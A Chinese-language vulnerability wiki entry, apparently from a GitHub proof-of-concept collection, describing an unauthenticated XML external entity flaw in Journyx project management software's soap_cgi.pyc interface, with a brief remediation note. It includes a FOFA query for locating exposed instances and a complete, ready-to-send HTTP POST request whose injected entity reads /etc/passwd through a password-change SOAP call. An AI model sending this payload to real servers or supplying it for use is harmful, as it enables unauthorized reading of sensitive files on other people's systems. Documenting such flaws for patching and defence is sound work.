---
fofa: "body="
source: "SourByte05/Vulnerability-Wiki-PoC"
---

# ournyx项目管理软件 soap_cgi.pyc XXE漏洞

# 漏洞描述

Journyx项目管理软件 soap_cgi.pyc 接口存在XML实体注入漏洞，未经身份认证的攻击者可以利用此漏洞读取系统内部敏感文件，获取敏感信息，使系统处于极不安全的状态。

影响版本

Journyx项目管理软件

# **漏洞状态**

| 漏洞细节 | 漏洞POC | 漏洞EXP | 在野利用 |
|------|-------|-------|------|
| 是 | 已公开 | 已公开 | 已知 |

## 风险等级

| 维度 | 评价 |
|----|----|
| 威胁等级 | 高危 |
| 影响面 | 高 |
| 攻击者价值 | 高 |
| 利用难度 | 低 |

# 漏洞复现

FOFA：body="Journyx"

POC/EXP：

POST /jtcgi/soap_cgi.pyc HTTP/1.1
Host: 127.0.0.1
User-Agent:Mozilla/5.0 (WindowsNT10.0;Win64; x64) AppleWebKit/537.36 (KHTML, likeGecko)Chrome/96.0.4664.93Safari/537.36
Content-Type: application/xml

<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"><soapenv:Header/><soapenv:Body><changeUserPassword><username>&test;</username><curpwd>zzz</curpwd><newpwd>zzz123</newpwd></changeUserPassword></soapenv:Body></soapenv:Envelope>

![image-20240809101040861](./.resource/ournyx项目管理软件soap_cgi.pycXXE漏洞/media/image-20240809101040861.png)


# 修复方案

1. 关闭互联网暴露面或接口设置访问权限

   升级至安全版本


---

> 来源：SourByte05/Vulnerability-Wiki-PoC（https://github.com/SourByte05/Vulnerability-Wiki-PoC）
